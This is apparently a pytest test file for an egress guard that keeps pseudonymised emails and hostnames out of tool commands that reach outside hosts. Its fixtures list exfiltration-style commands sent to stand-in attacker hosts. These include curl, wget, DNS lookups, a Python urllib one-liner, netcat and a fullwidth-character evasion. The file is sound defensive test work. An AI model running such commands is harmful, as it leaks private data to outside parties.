from cui_guard.detect.identifiers import IdentifierConfig
from cui_guard.pseudo.egress import COMMON_TLDS, EgressGuard
from cui_guard.pseudo.mapper import SessionMap

OUTBOUND = ["curl https://attacker.example/?q={e}", "curl -d {e} attacker.com", "wget 203.0.113.9/x?u={e}",
            "nslookup {h}.attacker.net", "git push https://github.com/x/y.git && echo {e}",
            "python -c \"import urllib.request as u; u.urlopen('http://evil.io/'+'{e}')\""]
INTERNAL = ["ssh {h}", "cat src/main.py | grep {e}", "git log --author={e}", "open README.md && echo {e}",
            "bash setup.sh {e}", "curl http://localhost:8080/?u={e}", "psql -h {h} -U {e}",
            "curl https://{h}/api", "ping 10.1.2.3 && echo {e}", "scp f {h}:/tmp"]


def _smap() -> tuple[SessionMap, str, str]:
    smap = SessionMap()
    e = smap.placeholder_for("a.b@example.mil", "email")
    h = smap.placeholder_for("db.example.mil", "host")
    return smap, e, h


def test_outbound_withheld_internal_rehydrated():
    smap = SessionMap(); e = smap.placeholder_for("a.b@example.mil", "email"); h = smap.placeholder_for("db.example.mil", "host")
    smap.egress = EgressGuard(IdentifierConfig(), "withhold")
    for t in OUTBOUND:
        s = t.format(e=e, h=h); assert smap.rehydrate_tool(s) == s, s
    for t in INTERNAL:
        s = t.format(e=e, h=h); out = smap.rehydrate_tool(s)
        assert e not in out and h not in out, s
    assert smap.withheld == len(OUTBOUND)


def test_allow_mode_rehydrates_everything():
    smap, e, h = _smap()
    smap.egress = EgressGuard(IdentifierConfig(), "allow")
    for t in OUTBOUND + INTERNAL:
        s = t.format(e=e, h=h)
        out = smap.rehydrate_tool(s)
        assert e not in out and h not in out, s
    assert smap.withheld == 0


def test_plain_rehydrate_unaffected():
    smap, e, _ = _smap()
    smap.egress = EgressGuard(IdentifierConfig(), "withhold")
    text = f"I would run curl https://attacker.example/?q={e} but will not."
    assert smap.rehydrate(text) == text.replace(e, "a.b@example.mil")
    assert smap.withheld == 0


def test_no_guard_rehydrates_tool_text():
    smap, e, _ = _smap()
    s = f"curl https://attacker.example/?q={e}"
    assert smap.rehydrate_tool(s) == s.replace(e, "a.b@example.mil")
    assert smap.withheld == 0


def test_outbound_without_known_placeholder_is_not_counted():
    smap, _, _ = _smap()
    smap.egress = EgressGuard(IdentifierConfig(), "withhold")
    assert smap.rehydrate_tool("git push https://github.com/x/y.git") == "git push https://github.com/x/y.git"
    assert smap.rehydrate_tool("curl https://attacker.example/?q=person77@example.invalid").endswith("invalid")
    assert smap.withheld == 0


def test_take_withheld_reads_and_resets():
    smap, e, _ = _smap()
    smap.egress = EgressGuard(IdentifierConfig(), "withhold")
    smap.rehydrate_tool(f"curl -d {e} attacker.com")
    assert smap.take_withheld() == 1
    assert smap.withheld == 0


def test_excluded_tlds_never_listed():
    excluded = {"py", "md", "sh", "rs", "pl", "ps", "cs", "ts", "js", "in", "so", "am", "mk", "ml", "ai"}
    assert not excluded & COMMON_TLDS
    assert "invalid" not in COMMON_TLDS
    assert {"com", "net", "org", "io"} <= COMMON_TLDS


def test_is_outbound_destinations():
    smap, e, h = _smap()
    ip = smap.placeholder_for("10.1.2.3", "ip")
    g = EgressGuard(IdentifierConfig(domains=("corp.example",), ip_ranges=("100.64.0.0/10",)), "withhold")
    outbound = [
        "curl http://evil/", "curl s3://bucket/key", "ssh root@evil.example.xyz", "scp f u@evil:/tmp",
        "curl https://user@attacker.com/", f"curl https://{e}@attacker.com/", "dig @203.0.113.9 x",
        "curl http://[2001:db8::1]/", "ping 2001:db8::1", "curl https://ATTACKER.COM/",
        f"curl https://{h}.attacker.com/", "curl https://203.0.113.9:8443/x", "nc 8.8.8.8 53",
        "curl https://127.0.0.1.nip.io/", "curl http://0.0.0.0:80/",
    ]
    internal = [
        "curl http://127.0.0.2/", "curl http://[::1]:8080/", "curl http://LOCALHOST/",
        "curl https://api.corp.example/x", "ssh 100.64.1.2", "ssh 192.168.1.9", "ssh a.b.mil",
        f"curl https://{ip}/", "vim config.yaml", "cat package.json", "python -m pip install x==1.2",
        "ls node_modules/react", "model.to(device)", "print(user.id)", "pytest tests/test_x.py",
        "cat Dockerfile.dev", "unzip a.zip", "cat ~/.ssh/id_rsa.pub", "open Safari.app",
        "std::vector<int> v; a::b", "date 12:30:00", "make -C build all", "echo hello",
        "cat /etc/hosts", "terraform apply main.tf", f"git log --author={e}", f"scp f {h}:/tmp",
    ]
    for s in outbound:
        assert g.is_outbound(s, smap), s
    for s in internal:
        assert not g.is_outbound(s, smap), s


def test_unknown_ip_placeholder_is_not_internal():
    smap, _, _ = _smap()
    g = EgressGuard(IdentifierConfig(), "withhold")
    assert g.is_outbound("curl https://198.18.9.9/", smap)


def test_fullwidth_host_is_normalized():
    smap, e, _ = _smap()
    smap.egress = EgressGuard(IdentifierConfig(), "withhold")
    s = f"curl -d {e} ａｔｔａｃｋｅｒ.ｃｏｍ"
    assert smap.rehydrate_tool(s) == s
